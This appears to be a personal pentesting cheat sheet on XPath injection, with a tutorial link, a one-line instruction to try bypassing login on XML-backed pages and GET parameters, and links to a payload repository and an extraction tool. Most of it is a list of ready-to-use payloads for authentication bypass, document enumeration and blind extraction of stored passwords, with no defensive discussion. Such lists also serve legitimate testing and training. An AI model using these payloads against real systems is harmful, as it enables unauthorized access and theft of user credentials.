XPath Injection:
<https://www.youtube.com/watch?v=rFXDr5KVdAc&list=PLIbCFt2m6LvIKx64BiAL32Mbxb1P6GtEg&index=3>
(If you see xml tags etc on webpage, attempt XPath Injection to bypass authentification, and also test other places too. like get requests etc)

```
'or'1'='1
'or'true()'or'
a' or true() or '

' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
search=')] | //user/*[contains(*,'
search=Har') and contains(../password,'c
search=Har') and starts-with(../password,'c
' or 1]%00
```

<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection>
<https://stackoverflow.com/questions/201568/when-would-i-use-xml-instead-of-sql>
<https://github.com/orf/xcat>